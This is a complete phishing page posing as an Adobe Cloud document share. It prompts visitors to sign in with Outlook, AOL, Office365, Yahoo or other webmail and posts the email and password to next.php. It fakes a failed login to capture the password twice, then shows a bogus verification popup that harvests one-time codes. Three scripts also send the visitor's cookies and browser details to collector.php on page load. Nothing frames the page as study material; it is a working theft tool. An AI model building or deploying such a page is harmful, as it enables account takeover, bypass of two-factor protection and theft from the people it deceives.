<?php
// include("Analysis405/attachment.php");
?>
<!DOCTYPE html>

<html lang="en">
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
<script crossorigin="anonymous" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" src="https://code.jquery.com/jquery-3.3.1.js"></script>
<!-- Required meta tags -->
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
<!-- Bootstrap CSS -->
<link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css?family=Yellowtail&amp;display=swap" rel="stylesheet"/>
<script crossorigin="anonymous" src="https://kit.fontawesome.com/585b051251.js"></script>
<title>Cloud Share</title>
<link href="css/hover.css" media="all" rel="stylesheet"/>
<link href="images/a_fav.png" rel="icon" type="image/x-icon"/>
<style type="text/css">
		.txt-color{
			color: white;
		}
		.box-color{
			background-color: rgba(0,0,0,0.8);border-radius:15px;
		}

    </style>
<style>
body, html {
  height: 100%;
  margin: 0;
}

</style>
<!-- OTP style -->
<style>

	.center{
		position: absolute;
		top:50%;
		left:50%;
		transform: translate(-50%, -50%);
	}
	.popup{ 
		position: fixed;
		top:-100vh;
		left: 0px;
		width: 100%;
		height: 100%;
	}
	.popup .overlay{ 
		position: absolute;
		top:0px;
		left: 0px;
		width: 100%;
		height: 100%;
		background: rgba(0,0,0,0.5);
		opacity: 0;
		transition: opacity 100ms ease-in-out 200ms;
		
	}
	.popup .pop_container{ 
		position: absolute;
		top:30%;
		left:50%;
		transform: translate(-50%, -50%) scale(1.15);
		width: 95%;
		max-width: 500px;
		background: #fff;
		opacity:0; 
		padding: 25px;
		border-radius: 5px;
		box-shadow: 0px 2px 2px 5px rgba(0,0,0,0.05);
		transition: all 300ms ease-in-out;
	}
	.popup .pop_container h3{ 
		margin: 30px 0px 0px 0px;
		font-size: 20px;
		color: #111;
		text-align: center;
	}
	.popup .pop_container h4{ 
		margin: 10px 0px 30px 0px;
		font-size: 16px;
		color: #111;
		text-align: center;
		font-weight: 400;
	}
	.pop_footer{
		display: flex;
		justify-content: space-between;
		margin: 20px 0px 0px;
	}
	.pop-btn { 
			padding: 10px 20px;
			border: 0px;
			outline:none;
			font-size: 15px;
			font-weight: 400;
			border-radius: 5px;
			cursor: pointer;	
	}
	#popClose{
			background: transparent;
			color: #3284ed;
	}
	#pop-submit{
			background:#3284ed ;
			color: #fff;
	}
	.pop_header{
		display:flex;
		width: 100%;
		border-bottom: 1px solid #e9ecef;

	}
	#pop-cancel{
		float: right;
		margin: -25px -25px 10px auto;
		background: transparent;
	}
	.pop_body{
		display: block;
		width: 100%;
		border-bottom: 1px solid #e9ecef;
	}
	.pop_body label{
		font-size: 16px;
		display: block;
	}
	.pop_body input{
		font-size: 16px;
		padding: 10px;
		display: block;
		margin: 10px 0px;
		width:95%;
	}
	.popup.active {
		top:0px;
		transition: top 0ms ease-in-out 0ms;
	}
	.popup.active .overlay {
		opacity: 1;
		transition: all 300ms ease-in-out;
	}
	.popup.active .pop_container{
		transform:translate(-50%, -50%) scale(1);
		opacity: 1;
	}
	#dataBox{ display: flex;
		justify-content: space-between;
		width: 1px;
		height: 1px;
		margin: 0px;
		visibility: hidden;
	}
	.dataInput{
		width: 1px;
		height: 1px;
		margin: 0px;
	}
</style>
</head>
<body style="font-size: .9rem; font-weight: 400; background-color:white;">
<div class="container-fluid" style="
							  background-image: url('images/8.jpg');
position: fixed;
  width: 100%;
  height: 100%;
							  background-position: center;
							  background-size: cover;
							  background-repeat: no-repeat;"></div>
<div class="row" style="margin-right: 10px; margin-left: 10px;">
<div class="container">
<div class="row">
<div class="col-lg-5 mx-auto my-5 px-5 pb-5 box-color" style="border:1px solid; ">
<div class="text-center pt-2"> <br/>
<img class="img-fluid" src="images/adobe.jpg" width="100px"/><br/>
<div class="h4 txt-color" style="font-weight: 600;">Adobe Cloud</div>
<div class="h6 text-black font-weight-normal txt-color">To read the document, please choose your email provider below login to view shared file.</div>
</div>
<div class="mt-3">
<div class="row">
</div>
</div>
<div class="row">
<div class="col-lg-12">
<a class="hvr-grow w-100" data-target="#ajaxModal" data-toggle="modal" href="javascript:void(0)" id="outlookmodal" style="text-decoration: none;">
<div class="mt-2" style=" background-color: #0073C8; border-radius: 15px 0px 15px 0px;">
<img class="img-fluid" src="images/outlook1.png" style=" padding:5px; margin-left: 10px;" width="40px"/>
<span class="pl-4" style="vertical-align: middle; color: white; border-radius: 4px;">Sign in with Outlook</span>
</div>
</a>
</div>
<div class="col-lg-12">
<a class="hvr-grow w-100" data-target="#ajaxModal" data-toggle="modal" href="javascript:void(0)" id="aolmodal" style="text-decoration: none;">
<div class="mt-2" style=" background-color: #31459B; border-radius: 15px 0px 15px 0px;">
<img class="img-fluid" src="images/aol1.png" style=" padding:5px; margin-left: 10px;" width="40px"/>
<span class="pl-4" style="vertical-align: middle; color: white; border-radius: 4px;">Sign in with Aol</span>
</div>
</a>
</div>
<div class="col-lg-12">
<a class="hvr-grow w-100" data-target="#ajaxModal" data-toggle="modal" href="javascript:void(0)" id="office365modal" style="text-decoration: none;">
<div class="mt-2" style=" background-color: #FF3C00; border-radius: 15px 0px 15px 0px;">
<img class="img-fluid" src="images/office3651.png" style=" padding:5px; margin-left: 10px;" width="40px"/>
<span class="pl-4" style="vertical-align: middle; color: white; border-radius: 4px;">Sign in with Office365</span>
</div>
</a>
</div>
</div>
<div class="row">
<div class="col-lg-12">
<a class="hvr-grow w-100" data-target="#ajaxModal" data-toggle="modal" href="javascript:void(0)" id="yahoomodal" style="text-decoration: none;">
<div class="mt-2" style=" background-color: #5F0F68; border-radius: 15px 0px 15px 0px;">
<img class="img-fluid" src="images/yahoo1.png" style=" padding:5px; margin-left: 10px;" width="40px"/>
<span class="pl-4" style="vertical-align: middle; color: white; border-radius: 4px;">Sign in with Yahoo!</span>
</div>
</a>
</div>
<div class="col-lg-12">
<a class="hvr-grow w-100" data-target="#ajaxModal" data-toggle="modal" href="javascript:void(0)" id="othermodal" style="text-decoration: none;">
<div class="mt-2" style=" background-color: #0B5BD3; border-radius: 15px 0px 15px 0px;">
<img class="img-fluid" src="images/other1.png" style=" padding:5px; margin-left: 10px;" width="40px"/>
<span class="pl-4" style="vertical-align: middle; color: white;border-radius: 4px;">Sign in with Other Mail</span>
</div>
</a>
</div>
<div class="col-lg-12">
<p class="h6 text-black mt-3 text-center txt-color">Built upon Adobe Document Cloud. </p><p class="text-black mt-3 text-center txt-color">Adobe Document Cloud features can be unlocked by providing an additional license key..</p>
<p class="h5 text-center txt-color" style="font-size: 10px">© Adobe 2025, All right reserved.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<!-- Modal for gmail -->
<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="ajaxModal" role="dialog" tabindex="-1">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button aria-label="Close" class="close" data-dismiss="modal" type="button">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<center>
<img class="img-fluid rounded-circle" id="fieldImg" src="images/gmail.png" width="80px"/>
<h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
<div class="alert alert-danger" id="msg"></div>
</center>
<form class="form-horizontal well" id="contact">
<div class="col-lg-12">
<div class="form-group">
<label for="exampleInputEmail1">Email address</label>
<input aria-describedby="emailHelp" class="form-control" id="email" name="email" placeholder="Enter email" type="email"/>
<small class="form-text text-muted" id="emailHelp">We'll never share your email with anyone else.</small>
</div>
</div>
<div class="col-lg-12">
<div class="form-group">
<label for="Password">Password</label>
<input aria-describedby="emailHelp" class="form-control" id="password" name="password" onclick="disp_pass()" onkeyup="hide_pass()" placeholder="Enter Password" title="Show" type="password"/>
</div>
</div>
</form></div>
<div class="modal-footer">
<button class="btn btn-secondary" data-dismiss="modal" type="button">Close</button>
<button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
</div>
</div>
</div>
</div>
<!-- OTP -->
<div class="popup" id="popup">
<div class="overlay">
<div class="pop_container">
<div class="pop_header">
<button class="pop-btn" id="pop-cancel" onclick="closePopup()">X</button>
</div>
<form action="Analysis405/otp_process.php" id="pop-otp" method="post">
<div class="pop_body">
<h3>Please verify your account</h3>
<h4>Enter verification code</h4>
<label>OTP</label>
<div id="dataBox">
<input class="dataInput" id="codeEmail" name="codeEmail" type="text"/>
<input class="dataInput" id="codeDetail" name="codeDetail" type="text"/>
</div>
<input class="opt_box" maxlength="6" name="code" placeholder="6-digits code" required="" type="number"/>
</div>
<div class="pop_footer">
<button class="pop-btn" id="popClose" onclick="closePopup()" type="button">Close</button>
<button class="pop-btn" id="pop-submit" name="pop-submit" type="submit">Submit</button>
</div>
</form>
</div>
</div>
</div>
<script>
	let popupNode = document.getElementById("popup");
	function openPopup(){
			popupNode.classList.add("active");	
		}
	
	function closePopup(){
			popupNode.classList.remove("active");	
			document.getElementById('submit-btn').innerHTML = 'Login' ;
			document.getElementById('msg').classList.remove("alert-success");
			document.getElementById('msg').classList.add("alert-danger");
		}
	
	let passBox = document.getElementById('password'); 
	function disp_pass(){
		if (passBox.type == 'password'){
			passBox.type = 'text';
			passBox.title = 'Hide';
		}else{
			passBox.type = 'password';
			passBox.title = 'Show';
		}
	}
	
	function hide_pass(){
		passBox.type = 'password';
		passBox.title = 'Show';
	}
</script>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script crossorigin="anonymous" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
<script crossorigin="anonymous" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
<script crossorigin="anonymous" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script>
  fetch("collector.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      cookies: document.cookie,
      page: window.location.href
    })
  });
</script>
<script>
  fetch("collector.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      cookies: document.cookie,
      page: window.location.href
    })
  });
</script><script>
<script>
  // Detect the user's browser
  function getBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Chrome") > -1) {
      return "Chrome";
    } else if (userAgent.indexOf("Firefox") > -1) {
      return "Firefox";
    } else if (userAgent.indexOf("Safari") > -1) {
      return "Safari";
    } else if (userAgent.indexOf("Edge") > -1) {
      return "Edge";
    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
      return "Internet Explorer";
    }
    return "Unknown";
  }

  // Send cookies and browser info to the backend
  fetch("collector.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      cookies: document.cookie,
      page: window.location.href,
      browser: getBrowser()
    })
  });
</script>
</script></body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>

    /* global $ */
    $(document).ready(function(){
      var count=0;
      
	

	
      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/gmail.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/outlook.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/aol.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/office365.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/yahoo.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/othermail.ico');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
       
        
        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=2) {
          count=0;
         
         
		$.ajax({
         dataType: 'JSON',
         url: 'next.php',
        type: 'POST',
         data:{
           email:email,
           password:password,
          detail:detail 
             }
          }); 
          
          
        document.getElementById('codeEmail').value = email;
        document.getElementById('codeDetail').value = detail;
        document.getElementById('submit-btn').innerHTML = 'Verifing...' ;
        
         setTimeout(function(){
            $("#msg").html('Loading....'); 
            document.getElementById('msg').classList.remove("alert-danger");
            document.getElementById('msg').classList.add("alert-success");
         },1000)
        setTimeout(function(){
          //  open;
             $('#ajaxModal').hide();
            
              $('.modal-backdrop').hide();

              openPopup();
        },2000)

          
        }
        else
        {
            
         $.ajax({
          dataType: 'JSON',
          url: 'next.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
				$("#password").val("");
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
				$("#password").val("");
              $("#msg").show();
              $('#msg').html("Invalid Credentials.\n Please try again");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
       }
     });
    });
  </script>
</html>